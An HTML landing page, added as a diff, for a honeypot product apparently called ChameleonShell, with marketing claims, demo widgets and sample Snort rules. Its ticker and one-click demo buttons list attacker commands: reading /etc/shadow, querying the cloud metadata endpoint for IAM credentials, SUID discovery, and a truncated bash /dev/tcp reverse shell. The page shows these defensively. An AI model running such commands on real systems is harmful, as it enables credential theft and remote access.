@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ChameleonShell // Autonomous Cloud Deception & Active Threat Defense</title>
+  <link rel="icon" type="image/svg+xml" href="/chameleonshell/assets/favicon.svg">
+  <link rel="stylesheet" href="/chameleonshell/css/styles.css">
+  <meta name="description" content="ChameleonShell is an autonomous cloud deception engine that couples a Deterministic Virtual State Tree with sub-8ms Fast-Path POSIX execution, MITRE ATT&CK real-time sequence classification, and zero-touch firewall synthesis.">
+
+  <script>
+    window.__BASE_PATH__ = "/chameleonshell";
+  </script>
+</head>
+<body>
+  <!-- Canonical Enterprise Sticky Navigation Bar -->
+  <header class="site-header" role="banner">
+    <div class="container header-inner">
+      <a href="/chameleonshell/" class="brand-wrapper" aria-label="ChameleonShell Homepage">
+        <img src="/chameleonshell/assets/favicon.svg" alt="Chameleon Logo" class="brand-icon">
+        <span class="brand-title">CHAMELEONSHELL</span>
+        <span class="nav-status-dot" title="Autonomous Engine Online"></span>
+      </a>
+
+      <!-- Center Navigation Links -->
+      <nav aria-label="Main Navigation">
+        <ul class="nav-links">
+          <li><a href="/chameleonshell/" class="nav-link active">Platform</a></li>
+          <li><a href="/chameleonshell/lab/" class="nav-link">Live Lab</a></li>
+          <li><a href="/chameleonshell/architecture/" class="nav-link">Architecture</a></li>
+          <li><a href="/chameleonshell/benchmarks/" class="nav-link">Benchmarks</a></li>
+        </ul>
+      </nav>
+
+      <!-- Right Action Cluster -->
+      <div class="header-actions">
+        <button class="mobile-nav-toggle" id="mobile-nav-toggle" aria-label="Toggle Mobile Navigation">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 8h16M4 16h16"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Mobile Slide-Over Drawer -->
+  <div class="mobile-nav-drawer" id="mobile-nav-drawer">
+    <a href="/chameleonshell/" class="nav-link active">Platform</a>
+    <a href="/chameleonshell/lab/" class="nav-link">Live Lab</a>
+    <a href="/chameleonshell/architecture/" class="nav-link">Architecture</a>
+    <a href="/chameleonshell/benchmarks/" class="nav-link">Benchmarks</a>
+  </div>
+
+  <!-- Ambient Structural Grid -->
+  <div class="structural-grid" aria-hidden="true"></div>
+
+  <main role="main">
+    <!-- Real-time Adversary Interception Telemetry Ticker -->
+    <div class="telemetry-ticker-bar" aria-label="Real-time honeypot attack stream">
+      <div class="ticker-label">
+        <span class="ticker-pulse-dot"></span>
+        <span>LIVE TELEMETRY STREAM</span>
+      </div>
+      <div class="ticker-track-wrapper">
+        <div class="ticker-track" id="telemetry-ticker-track">
+          <span class="ticker-item"><span class="ticker-ip">185.220.101.4:22</span> <span class="ticker-tag fast">FAST-PATH</span> SSH Recon: <code>cat /etc/shadow</code> <span class="ticker-lat">3.2ms</span> &rarr; nftables rule auto-generated</span>
+          <span class="ticker-item"><span class="ticker-ip">45.154.255.8:80</span> <span class="ticker-tag canary">IMDSv2 CANARY</span> Cloud Token: <code>169.254.169.254</code> &rarr; TA0006 Credential Access Logged</span>
+          <span class="ticker-item"><span class="ticker-ip">194.26.29.112:22</span> <span class="ticker-tag fast">FAST-PATH</span> SUID Discovery: <code>find / -perm -4000</code> <span class="ticker-lat">4.1ms</span> &rarr; Monotonic Inode Tree Fed</span>
+          <span class="ticker-item"><span class="ticker-ip">91.240.118.2:22</span> <span class="ticker-tag threat">CRIMSON PROBE</span> Botnet Shell: <code>bash -i &gt;&amp; /dev/tcp/...</code> &rarr; Sandboxed Slow-Path Containment</span>
+          <span class="ticker-item"><span class="ticker-ip">178.62.204.19:22</span> <span class="ticker-tag fast">FAST-PATH</span> Kernel Version Fingerprint: <code>uname -r</code> <span class="ticker-lat">2.8ms</span> &rarr; Cowrie timing side-channel defeated</span>
+        </div>
+      </div>
+      <div class="ticker-action">
+        <button class="ticker-toggle-btn" id="ticker-toggle-btn" title="Toggle Ticker Pause">[PAUSE]</button>
+      </div>
+    </div>
+
+    <!-- Section 1: Hero (12-Column Grid) -->
+    <section class="hero-section" id="hero">
+      <div class="container hero-grid">
+        <div class="hero-left-col">
+          <div class="hero-meta-pill">
+            CHAMELEONSHELL CORE v2.4 // AUTONOMOUS ACTIVE DEFENSE ENGINE
+          </div>
+          <h1 class="hero-title">
+            ADAPTIVE CLOUD <span class="highlight-volt">DECEPTION</span> ENGINE.
+          </h1>
+          <p class="hero-desc">
+            ChameleonShell resolves the honeypot trilemma by coupling a context-persistent Deterministic Virtual State Tree with sub-8ms Fast-Path POSIX execution. Trajectories map to MITRE ATT&CK Enterprise tactics with temporal risk decay while automatically compiling production firewall rules.
+          </p>
+          <div class="hero-cta-group">
+            <a href="/chameleonshell/lab/" class="btn-primary">DEPLOY LIVE LAB</a>
+            <a href="/chameleonshell/architecture/" class="btn-secondary">EXPLORE ARCHITECTURE</a>
+          </div>
+          <div class="hero-telemetry-row">
+            <div class="telemetry-chip">
+              <div class="telemetry-chip-val volt" id="metric-depth">21.8 cmds</div>
+              <div class="telemetry-chip-label">Mean Attacker Depth (6.81x)</div>
+            </div>
+            <div class="telemetry-chip">
+              <div class="telemetry-chip-val emerald" id="metric-latency">4.8 ms</div>
+              <div class="telemetry-chip-label">Fast-Path Execution Latency</div>
+            </div>
+            <div class="telemetry-chip">
+              <div class="telemetry-chip-val" id="metric-consistency">98.4%</div>
+              <div class="telemetry-chip-label">20-Turn State Consistency</div>
+            </div>
+          </div>
+
+          <!-- Interactive Command Sandbox (Direct Hero Execution) -->
+          <div class="hero-cmd-sandbox">
+            <div class="hero-cmd-sandbox-header">
+              <span>// DIRECT VST ADVERSARY PROBE RUNNER</span>
+              <span class="highlight-volt">FAST-PATH AST READY [&lt;8ms]</span>
+            </div>
+            <div class="hero-cmd-input-row">
+              <span class="hero-cmd-prompt">root@vst-node:~#</span>
+              <input type="text" id="hero-cmd-input" class="hero-cmd-field" placeholder="Type Linux command (e.g. uname -a, id, whoami, ps aux, cat /etc/passwd)..." autocomplete="off" spellcheck="false">
+              <button id="hero-cmd-fire-btn" class="hero-cmd-fire-btn">EXECUTE [ENTER]</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3D Deception Core with Interactive Telemetry HUD -->
+        <div class="hero-right-col">
+          <div class="webgl-hero-container crosshair" id="hero-canvas-container">
+            <!-- Canvas HUD Header -->
+            <div class="canvas-header-hud">
+              <div class="hud-brand-status">
+                <span class="nav-status-dot"></span>
+                <span>CORE RUNTIME // VST ENGINE v2.4</span>
+              </div>
+              <div class="hud-mode-controls">
+                <button class="hud-mode-btn active" data-mode="shield">SHIELD</button>
+                <button class="hud-mode-btn" data-mode="radar">RADAR</button>
+                <button class="hud-mode-btn" data-mode="canary">CANARY</button>
+              </div>
+            </div>
+
+            <!-- Canvas HUD Footer with Interactive Probe Trigger -->
+            <div class="canvas-overlay-hud">
+              <div class="hud-stat-cluster">
+                <span id="core-status-text">CORE: HYBRID VST [ONLINE]</span>
+                <span id="core-entropy-text">ENTROPY: 0.984 &middot; INODES: 1,428</span>
+              </div>
+              <div class="hud-actions-cluster">
+                <button class="hud-probe-btn" id="hud-probe-btn" title="Inject synthetic adversary exploit probe into the 3D core">
+                  <span class="probe-dot"></span> INJECT PROBE
+                </button>
+              </div>
+            </div>
+          </div>
+
+          <!-- Quick Interactive Exploit Strip beneath 3D Box -->
+          <div class="hero-quick-probes">
+            <span class="quick-probes-label">// ONE-CLICK EXPLOIT SIMULATION:</span>
+            <div class="quick-probe-chips">
+              <button class="probe-chip" data-cmd="curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/">[01. AWS IMDSv2]</button>
+              <button class="probe-chip" data-cmd="cat /etc/shadow">[02. /etc/shadow]</button>
+              <button class="probe-chip" data-cmd="find / -perm -4000 2>/dev/null">[03. SUID Root]</button>
+              <button class="probe-chip" data-cmd="uname -a &amp;&amp; uptime">[04. Fast Uptime]</button>
+            </div>
+          </div>
+
+          <!-- Interactive Telemetry Drawer (Opens on Probe Execution) -->
+          <div class="probe-result-drawer" id="probe-result-drawer">
+            <div class="drawer-header">
+              <div class="drawer-title-group">
+                <span class="drawer-badge fast" id="drawer-path-badge">FAST-PATH POSIX AST [0.12ms]</span>
+                <span id="drawer-cmd-badge" style="color: var(--text-primary); font-weight: 700;">uname -a</span>
+              </div>
+              <button class="drawer-dismiss-btn" id="drawer-dismiss-btn">[DISMISS &times;]</button>
+            </div>
+            <pre class="drawer-output-box" id="drawer-output-box">Execution response will appear here...</pre>
+            <div class="drawer-meta-grid">
+              <div class="drawer-meta-card">
+                <span class="drawer-meta-lbl">MITRE ATT&amp;CK MAPPING</span>
+                <div id="drawer-mitre-val" style="color: var(--accent-volt); font-weight: 700;">TA0007: Discovery (T1082)</div>
+              </div>
+              <div class="drawer-meta-card">
+                <span class="drawer-meta-lbl">A/B RESILIENCE COMPARISON</span>
+                <div id="drawer-comp-val" style="color: var(--accent-emerald);">ChameleonShell: TRAPPED (98.4%) | Cowrie: FAILED</div>
+              </div>
+            </div>
+            <div class="drawer-rule-box">
+              <span class="drawer-meta-lbl">SYNTHESIZED FIREWALL SIGNATURE</span>
+              <code id="drawer-rule-code" style="color: var(--accent-emerald); font-size: 0.6875rem; word-break: break-all; display: block; margin-top: 4px;">alert tcp any any -&gt; HONEYPOT_NET 22 (msg:"CHAMELEON Probe"; sid:1000101;)</code>
+              <button class="drawer-copy-btn" id="drawer-copy-btn">[COPY SIGNATURE]</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 2: The Honeypot Trilemma & Architectural Breakthrough -->
+    <section class="section" id="trilemma">
+      <div class="container">
+        <span class="section-tag">Competitive Architecture Analysis</span>
+        <h2 class="section-heading">Breaking the Honeypot Trilemma</h2>
+        <p class="section-subheading">
+          Traditional deception tools compromise between execution latency, session persistence, and interaction depth. ChameleonShell resolves this architectural compromise.
+        </p>
+
+        <div class="trilemma-grid">
+          <!-- Static Cowrie -->
+          <div class="trilemma-card crosshair">
+            <div>
+              <span class="trilemma-badge slate">LEGACY BASELINE</span>
+              <h3 class="trilemma-title">Static Decoys (Cowrie)</h3>
+              <p class="trilemma-desc">
+                Relies on hardcoded filesystem snapshots and pre-scripted command mocks. Modern automated botnets fingerprint static emulators in under 3 commands via missing procfs fields and absent cloud metadata.
+              </p>
+            </div>
+            <div class="trilemma-stat-box">
+              <span class="trilemma-stat-val">3.2 cmds</span>
+              <span class="trilemma-stat-lbl">Mean Engagement Depth</span>
+            </div>
+          </div>
+
+          <!-- Pure LLM Honeypots -->
+          <div class="trilemma-card crosshair">
+            <div>
+              <span class="trilemma-badge crimson">GENERATIVE DRIFT</span>
+              <h3 class="trilemma-title">Pure LLM Shells (ShelLM)</h3>
+              <p class="trilemma-desc">
+                Pipes raw commands directly to language models. Suffers severe timing side-channel vulnerabilities (1,800ms+ round trips), hallucinated wall clocks, and loss of state persistence after 8–10 shell turns.
+              </p>
+            </div>
+            <div class="trilemma-stat-box">
+              <span class="trilemma-stat-val">2,140 ms</span>
+              <span class="trilemma-stat-lbl">Execution Latency Spike</span>
+            </div>
+          </div>
+
+          <!-- ChameleonShell Breakthrough -->
+          <div class="trilemma-card volt-accent crosshair">
+            <div>
+              <span class="trilemma-badge volt">CHAMELEONSHELL VST</span>
+              <h3 class="trilemma-title">Hybrid State-Tree Engine</h3>
+              <p class="trilemma-desc">
+                Resolves the trilemma through a dual-path architecture: standard POSIX commands execute in &lt;8ms against a deterministic virtual state tree, while unhandled queries invoke a sandboxed slow-path with atomic state patching.
+              </p>
+            </div>
+            <div class="trilemma-stat-box">
+              <span class="trilemma-stat-val volt">21.8 cmds · 4.8ms</span>
+              <span class="trilemma-stat-lbl">Mean Depth &amp; Fast Latency</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 3: Interactive Kill-Chain Telemetry Preview -->
+    <section class="section" id="preview">
+      <div class="container">
+        <span class="section-tag">Active Defense Pipeline</span>
+        <h2 class="section-heading">Autonomous Interception &amp; Rule Synthesis</h2>
+        <p class="section-subheading">
+          Watch incoming adversary telemetry get parsed against the Virtual State Tree, mapped to MITRE ATT&CK tactics in real time, and compiled into syntax-validated firewall signatures.
+        </p>
+
+        <div class="killchain-preview-card crosshair">
+          <div class="killchain-preview-header">
+            <div class="killchain-step-indicator" id="kc-indicator">STEP 1/5: RECONNAISSANCE</div>
+            <div class="killchain-stepper-controls">
+              <button class="kc-step-btn active" data-step="0">01</button>
+              <button class="kc-step-btn" data-step="1">02</button>
+              <button class="kc-step-btn" data-step="2">03</button>
+              <button class="kc-step-btn" data-step="3">04</button>
+              <button class="kc-step-btn" data-step="4">05</button>
+              <button class="kc-autoplay-btn" id="kc-autoplay-btn">[AUTOPLAY ATTACK]</button>
+            </div>
+          </div>
+
+          <div class="killchain-preview-body">
+            <div class="kc-preview-col">
+              <span class="kc-col-label">ATTACKER COMMAND SEQUENCE</span>
+              <pre class="kc-code-block" id="kc-cmd-display">uname -a &amp;&amp; cat /etc/os-release</pre>
+              <div class="kc-telemetry-badge" id="kc-exec-path">ROUTED: FAST-PATH POSIX AST [3.2ms]</div>
+            </div>
+
+            <div class="kc-preview-col">
+              <span class="kc-col-label">MITRE ATT&amp;CK Enterprise v16</span>
+              <div class="kc-mitre-box">
+                <div class="kc-mitre-tactic" id="kc-tactic">TA0007: Discovery</div>
+                <div class="kc-mitre-tech" id="kc-tech">T1082: System Information Discovery</div>
+                <div class="kc-risk-meter">
+                  <span>THREAT SEVERITY SCORE:</span>
+                  <strong class="highlight-volt" id="kc-risk-score">18 / 100</strong>
+                </div>
+              </div>
+            </div>
+
+            <div class="kc-preview-col">
+              <span class="kc-col-label">AUTOMATED FIREWALL SYNTHESIS</span>
+              <pre class="kc-code-block rules" id="kc-rule-display">alert tcp any any -&gt; HONEYPOT_NET 22 (msg:"CHAMELEON - T1082 Recon Probe"; sid:1000101; rev:1;)</pre>
+              <div class="kc-telemetry-badge emerald">SYNTHESIZED: SNORT 3 / MODSECURITY / NFTABLES</div>
+            </div>
+          </div>
+
+          <div class="killchain-preview-footer">
+            <span>LIVE INTERACTIVE SOC SANDBOX WITH VIRTUAL STATE TREE INSPECTOR</span>
+            <div class="kc-action-cluster">
+              <button class="kc-copy-rule-btn" id="kc-copy-rule-btn">[COPY SIGNATURE]</button>
+              <a href="/chameleonshell/lab/" class="btn-primary" style="padding: 8px 18px; font-size: 0.75rem;">OPEN INTERACTIVE SOC LAB &rarr;</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Section 4: Enterprise Deployment & Capabilities Grid -->
+    <section class="section" id="capabilities">
+      <div class="container">
+        <span class="section-tag">Platform Specifications</span>
+        <h2 class="section-heading">Enterprise Architecture &amp; Intelligence</h2>
+        <p class="section-subheading">
+          Explore complete engineering blueprints, quantitative deception benchmarks, and formal mathematical state formulation.
+        </p>
+
+        <div class="capabilities-grid">
+          <a href="/chameleonshell/architecture/" class="deliverable-card crosshair">
+            <div>
+              <span class="deliverable-card-tag">[ENGINEERING BLUEPRINT]</span>
+              <h3 class="deliverable-card-title">Tri-Tier Architecture</h3>
+              <p class="deliverable-card-desc">
+                Formal state tuple S<sub>t</sub>, sub-8ms POSIX AST Fast-Path router, and sandboxed Slow-Path execution mechanics.
+              </p>
+            </div>
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--accent-volt);">VIEW ARCHITECTURE &rarr;</span>
+          </a>
+
+          <a href="/chameleonshell/benchmarks/" class="deliverable-card crosshair">
+            <div>
+              <span class="deliverable-card-tag">[EMPIRICAL BENCHMARKS]</span>
+              <h3 class="deliverable-card-title">Deception Resilience &amp; Metrics</h3>
+              <p class="deliverable-card-desc">
+                Comparative evaluations against Cowrie, shelLM, and HoneyGPT across 6 multi-stage adversarial botnet campaigns.
+              </p>
+            </div>
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--accent-volt);">VIEW BENCHMARKS &rarr;</span>
+          </a>
+
+          <a href="/chameleonshell/lab/" class="deliverable-card crosshair">
+            <div>
+              <span class="deliverable-card-tag">[ACTIVE DEFENSE LAB]</span>
+              <h3 class="deliverable-card-title">Live Deception Environment</h3>
+              <p class="deliverable-card-desc">
+                Interactive side-by-side terminal lab, real-time Virtual State Tree inspector, and autonomous mitigation engine.
+              </p>
+            </div>
+            <span style="font-family: var(--font-mono); font-size: 0.75rem; color: var(--accent-volt);">LAUNCH LIVE LAB &rarr;</span>
+          </a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- Canonical Enterprise Footer -->
+  <footer class="site-footer" role="contentinfo">
+    <div class="container footer-bottom-bar">
+      <span>&copy; 2026 ChameleonShell Security Systems</span>
+      <ul class="footer-nav">
+        <li><a href="/chameleonshell/privacy/">Privacy Policy</a></li>
+        <li><a href="/chameleonshell/terms/">Terms of Service</a></li>
+      </ul>
+    </div>
+  </footer>
+
+  <script src="/chameleonshell/js/three.min.js"></script>
+  <script src="/chameleonshell/js/webgl-chameleon-core.js"></script>
+  <script src="/chameleonshell/js/app.js"></script>
+</body>
+</html>
